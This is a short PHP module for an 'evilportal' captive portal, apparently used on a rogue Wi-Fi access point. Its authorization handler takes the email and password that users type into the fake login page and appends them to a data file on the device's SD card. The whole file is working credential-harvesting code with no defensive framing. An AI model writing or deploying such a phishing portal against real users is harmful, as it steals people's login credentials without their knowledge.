<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        if (!is_dir('/sd/evilportal-data/')) {

          mkdir('/sd/evilportal-data/');
        }

        if (isset($_POST['email'])) {
          file_put_contents("/sd/evilportal-data/data.txt", $_POST['email'] . ' : ' . $_POST['pass'] . "\n", FILE_APPEND);
        }
        // Call parent to handle basic authorization first
        parent::handleAuthorization();

    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
